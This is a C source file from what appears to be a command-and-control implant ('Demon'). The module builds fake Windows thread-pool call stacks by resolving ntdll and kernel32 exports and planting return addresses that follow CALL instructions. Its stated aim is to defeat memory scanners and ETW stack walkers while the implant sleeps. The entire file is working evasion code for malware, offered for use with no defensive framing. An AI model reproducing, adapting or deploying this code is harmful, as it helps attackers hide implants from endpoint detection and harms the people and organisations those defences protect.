/*
 * CallStack.c — Synthetic Call Stack Fabrication
 *
 * Creates realistic-looking thread pool call stacks to defeat memory
 * scanners and ETW stack walkers during sleep obfuscation.
 *
 * Strategy:
 *   1. Scan ntdll and kernel32 export tables for known thread infrastructure
 *      functions (RtlUserThreadStart, BaseThreadInitThunk, TpReleaseCleanupGroupMembers, etc.)
 *   2. Within each found function, locate a CALL instruction and use the
 *      address *after* it as a return address (this is what a real call stack
 *      would contain — the instruction following a CALL).
 *   3. Build a synthetic frame chain: each frame has proper return address,
 *      shadow space, and alignment matching the x64 calling convention.
 *   4. During sleep, write these frames to the spoofed stack so that
 *      tools walking the stack see legitimate ntdll/kernel32 addresses.
 *
 * The resulting stack looks like a standard Windows thread pool worker
 * blocked in NtWaitForSingleObject, which is the most common benign
 * thread state in any Windows process.
 */

#include <Demon.h>
#include <common/Macros.h>
#include <core/CallStack.h>
#include <core/Win32.h>
#include <core/MiniStd.h>

#if _WIN64

/* ----------------------------------------------------------------
 *  Internal: Find a CALL instruction within a function body and
 *  return the address of the instruction *following* the CALL.
 *  This is what the return address on a real stack would be.
 *
 *  We scan for common CALL encodings:
 *    E8 xx xx xx xx   — CALL rel32 (5 bytes)
 *    FF 15 xx xx xx xx — CALL [rip+disp32] (6 bytes)
 *    FF Dx            — CALL reg (2 bytes, where x = D0-D7)
 *
 *  ScanLen limits how far into the function we look.
 * ---------------------------------------------------------------- */
static PVOID FindRetAddrAfterCall(
    _In_ PVOID FuncAddr,
    _In_ ULONG ScanLen
) {
    PBYTE Code = ( PBYTE ) FuncAddr;

    if ( ! Code || ! ScanLen ) {
        return NULL;
    }

    for ( ULONG i = 0; i < ScanLen - 5; i++ )
    {
        /* E8 rel32 — relative CALL (most common) */
        if ( Code[ i ] == 0xE8 ) {
            return ( PVOID ) ( &Code[ i + 5 ] );
        }

        /* FF 15 disp32 — indirect CALL [rip+disp32] */
        if ( i < ScanLen - 6 && Code[ i ] == 0xFF && Code[ i + 1 ] == 0x15 ) {
            return ( PVOID ) ( &Code[ i + 6 ] );
        }

        /* FF D0..D7 — CALL register */
        if ( Code[ i ] == 0xFF && ( Code[ i + 1 ] >= 0xD0 && Code[ i + 1 ] <= 0xD7 ) ) {
            return ( PVOID ) ( &Code[ i + 2 ] );
        }

        /* 41 FF D0..D7 — CALL r8..r15 (REX.B prefix) */
        if ( i < ScanLen - 3 && Code[ i ] == 0x41 && Code[ i + 1 ] == 0xFF &&
             ( Code[ i + 2 ] >= 0xD0 && Code[ i + 2 ] <= 0xD7 ) ) {
            return ( PVOID ) ( &Code[ i + 3 ] );
        }
    }

    /* Fallback: if no CALL found, return addr a few bytes into the function.
     * This is still within the module's code section and won't look suspicious. */
    if ( ScanLen > 0x10 ) {
        return ( PVOID ) ( &Code[ 0x10 ] );
    }

    return NULL;
}

/* ----------------------------------------------------------------
 *  Internal: Try to resolve a function by walking the export table.
 *  We can't use the hash-based lookup here because these function
 *  names aren't in our Defines.h — so we do a direct string match
 *  against the export name table.
 * ---------------------------------------------------------------- */
static PVOID FindExportByName(
    _In_ PVOID Module,
    _In_ PCHAR Name
) {
    PIMAGE_NT_HEADERS       NtHdr   = { 0 };
    PIMAGE_EXPORT_DIRECTORY ExpDir  = { 0 };
    PDWORD                  Names   = { 0 };
    PDWORD                  Funcs   = { 0 };
    PWORD                   Ords    = { 0 };
    PCHAR                   ExpName = { 0 };

    if ( ! Module || ! Name ) {
        return NULL;
    }

    NtHdr  = ( PIMAGE_NT_HEADERS ) ( ( PBYTE ) Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    ExpDir = ( PIMAGE_EXPORT_DIRECTORY ) ( ( PBYTE ) Module + NtHdr->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    Names  = ( PDWORD ) ( ( PBYTE ) Module + ExpDir->AddressOfNames );
    Funcs  = ( PDWORD ) ( ( PBYTE ) Module + ExpDir->AddressOfFunctions );
    Ords   = ( PWORD )  ( ( PBYTE ) Module + ExpDir->AddressOfNameOrdinals );

    for ( DWORD i = 0; i < ExpDir->NumberOfNames; i++ )
    {
        ExpName = ( PCHAR ) ( ( PBYTE ) Module + Names[ i ] );

        /* manual strcmp — we can't use C runtime */
        PCHAR a = Name;
        PCHAR b = ExpName;
        while ( *a && *b && *a == *b ) { a++; b++; }

        if ( *a == 0 && *b == 0 ) {
            return ( PVOID ) ( ( PBYTE ) Module + Funcs[ Ords[ i ] ] );
        }
    }

    return NULL;
}

/* ----------------------------------------------------------------
 *  SynthStackInit — populate the synthetic frame descriptors.
 *
 *  We build a realistic thread-pool-style stack:
 *
 *  Frame 0: RtlUserThreadStart (ntdll)  — outermost frame
 *  Frame 1: BaseThreadInitThunk (kernel32) — always present
 *  Frame 2: TpReleaseCleanupGroupMembers or TpCallbackMayRunLong (ntdll)
 *  Frame 3: NtWaitForSingleObject (ntdll) — innermost (where we "sleep")
 *
 *  Any frame we can't resolve is skipped gracefully.
 *  Minimum 2 frames required for initialization to succeed.
 * ---------------------------------------------------------------- */
BOOL SynthStackInit(
    _Out_ PSYNTH_STACK_CTX Ctx
) {
    PVOID Ntdll    = Instance->Modules.Ntdll;
    PVOID Kernel32 = Instance->Modules.Kernel32;

    struct {
        PVOID  Module;
        PCHAR  FuncName;
        ULONG  ScanLen;     /* how far to scan for CALL instruction */
        ULONG  FrameSize;   /* simulated stack frame size            */
    } Candidates[] = {
        /* Frame 0 (bottom of stack): RtlUserThreadStart */
        { Ntdll,    "RtlUserThreadStart",               0x40, 0x48 },
        /* Frame 1: BaseThreadInitThunk */
        { Kernel32, "BaseThreadInitThunk",               0x30, 0x30 },
        /* Frame 2: a thread-pool function — try several in priority order */
        { Ntdll,    "TpReleaseCleanupGroupMembers",      0x80, 0x68 },
        /* Frame 3 (top): NtWaitForSingleObject — this is what the thread "blocks" on */
        { Ntdll,    "NtWaitForSingleObject",             0x20, 0x28 },
    };

    /* Alternate candidates for Frame 2 if primary isn't exported */
    PCHAR Frame2Alts[] = {
        "TpCallbackMayRunLong",
        "TpAllocWork",
        "TpPostWork",
        "TpSimpleTryPost",
        NULL
    };

    if ( ! Ctx || ! Ntdll || ! Kernel32 ) {
        return FALSE;
    }

    MemSet( Ctx, 0, sizeof( SYNTH_STACK_CTX ) );

    ULONG Count = 0;

    for ( ULONG i = 0; i < ( sizeof( Candidates ) / sizeof( Candidates[0] ) ); i++ )
    {
        PVOID FuncAddr = FindExportByName( Candidates[ i ].Module, Candidates[ i ].FuncName );

        /* For Frame 2, try alternatives if primary fails */
        if ( ! FuncAddr && i == 2 )
        {
            for ( ULONG j = 0; Frame2Alts[ j ] != NULL; j++ )
            {
                FuncAddr = FindExportByName( Ntdll, Frame2Alts[ j ] );
                if ( FuncAddr ) {
                    PRINTF( "SynthStack: using alternate Frame2: %s\n", Frame2Alts[ j ] )
                    break;
                }
            }
        }

        if ( ! FuncAddr ) {
            PRINTF( "SynthStack: could not find %s — skipping frame\n", Candidates[ i ].FuncName )
            continue;
        }

        /* Find a return address after a CALL instruction within this function */
        PVOID RetAddr = FindRetAddrAfterCall( FuncAddr, Candidates[ i ].ScanLen );
        if ( ! RetAddr ) {
            /* Fallback: use function address + small offset */
            RetAddr = ( PVOID ) ( ( PBYTE ) FuncAddr + 0x8 );
        }

        Ctx->Frames[ Count ].ReturnAddress = RetAddr;
        Ctx->Frames[ Count ].FrameBase     = NULL; /* will be set at write time */
        Ctx->Frames[ Count ].FrameSize     = Candidates[ i ].FrameSize;
        Count++;
    }

    Ctx->FrameCount  = Count;
    Ctx->Initialized = ( Count >= 2 ); /* need at least 2 frames for a believable stack */

    PRINTF( "SynthStack: initialized with %d frames (ok=%d)\n", Count, Ctx->Initialized )

    return Ctx->Initialized;
}

/* ----------------------------------------------------------------
 *  SynthStackWrite — lay down synthetic frames on the stack.
 *
 *  Starting from Rsp, we write frames bottom-up (Frame 0 is at the
 *  highest address, Frame N is at the lowest). Each frame is:
 *
 *    [Rsp + 0x00] = return address (pointing into legit module)
 *    [Rsp + 0x08] = saved RBP (points to parent frame's RBP slot)
 *    [Rsp + 0x10 .. FrameSize] = zeroed shadow space / locals
 *
 *  Returns the final (lowest) RSP value to set in the spoofed context.
 * ---------------------------------------------------------------- */
ULONG_PTR SynthStackWrite(
    _In_ PSYNTH_STACK_CTX Ctx,
    _In_ ULONG_PTR        Rsp
) {
    ULONG_PTR CurrentRsp = Rsp;
    ULONG_PTR PrevRbp    = 0;

    if ( ! Ctx || ! Ctx->Initialized || Ctx->FrameCount == 0 ) {
        return Rsp;
    }

    /* Align RSP to 16-byte boundary (x64 ABI requirement) */
    CurrentRsp &= ~( ( ULONG_PTR ) 0xF );

    /* We write frames starting from the bottom of the stack (frame 0 = outermost).
     * Frame 0 is at the highest address, each subsequent frame is lower. */

    /* First pass: calculate total stack space needed and start position */
    ULONG TotalSize = 0;
    for ( ULONG i = 0; i < Ctx->FrameCount; i++ ) {
        TotalSize += Ctx->Frames[ i ].FrameSize;
    }

    /* Position: start writing from (Rsp - TotalSize) upward */
    CurrentRsp -= TotalSize;
    CurrentRsp &= ~( ( ULONG_PTR ) 0xF ); /* re-align after subtraction */

    /* Zero the entire region first */
    MemSet( ( PVOID ) CurrentRsp, 0, TotalSize );

    /* Second pass: write frames from bottom (0) to top (N-1) */
    ULONG_PTR WritePos = CurrentRsp + TotalSize; /* start at bottom of stack */
    PrevRbp = 0; /* outermost frame has no parent */

    for ( ULONG i = 0; i < Ctx->FrameCount; i++ )
    {
        WritePos -= Ctx->Frames[ i ].FrameSize;

        /* [WritePos + 0x00] = return address */
        *( ( PVOID* ) ( WritePos ) ) = Ctx->Frames[ i ].ReturnAddress;

        /* [WritePos + 0x08] = saved RBP (frame chain) */
        *( ( ULONG_PTR* ) ( WritePos + sizeof( PVOID ) ) ) = PrevRbp;

        /* Update RBP for next frame — point to where we stored RBP */
        PrevRbp = WritePos + sizeof( PVOID );

        /* Remaining space in frame is shadow space / locals — left as zero */
    }

    /* Return the final RSP (top of the innermost frame) */
    return WritePos;
}

#endif /* _WIN64 */
